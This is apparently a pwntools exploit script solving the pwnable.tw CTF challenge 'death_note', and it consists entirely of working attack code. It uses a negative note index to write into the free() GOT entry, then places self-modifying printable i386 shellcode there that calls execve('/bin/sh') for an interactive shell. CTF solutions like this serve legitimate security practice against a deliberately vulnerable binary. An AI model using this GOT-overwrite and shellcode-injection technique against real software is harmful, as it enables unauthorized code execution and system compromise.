from pwn import *
import sys
import time

context.update(os='linux', arch='i386')


if len(sys.argv) == 1:
	io = process("./death_note")
else:
	io = remote("chall.pwnable.tw", 10201)
e = ELF("./death_note")

free_at = -1*(e.symbols['note'] - e.got['free'])/4

def choose(idx):
	io.sendlineafter("Your choice :", str(idx))
def indexOf(idx):
	io.sendlineafter("Index :", str(idx))
def show(idx):
	choose(2)
	indexOf(idx)
	io.recvuntil("Name : ")
	return io.recvline()
def add(idx, name):
	choose(1)
	indexOf(idx)
	io.sendafter("Name :", str(name))
def free(idx):
	choose(3)
	indexOf(idx)

shellcode = """
    	/* execve(path='/bin///sh', argv=0, envp=0) */
    	/* push '/bin///sh\x00' */
    	push 0x68
    	push 0x732f2f2f
   	push 0x6e69622f
	push esp
	pop ebx
	
	/* rewrite shellcode to int 0x80, eax -> shellcode itself */
	push 0x40
	pop ecx
	sub byte ptr[eax + 0x2d], cl
	sub byte ptr[eax + 0x2d], cl
	push 0x33
	pop ecx
	sub byte ptr[eax + 0x2c], cl
	
	/* xor ecx, edx */
	push edx
	pop ecx
	
	/* eax = 0xb -> sys_execve */
	push edx
	pop eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
	inc eax
"""

shellcode = asm(shellcode) + '\x00\x00' # offset 0x29

print "free_at offset: {}".format(free_at)
add(free_at, shellcode)
io.interactive()
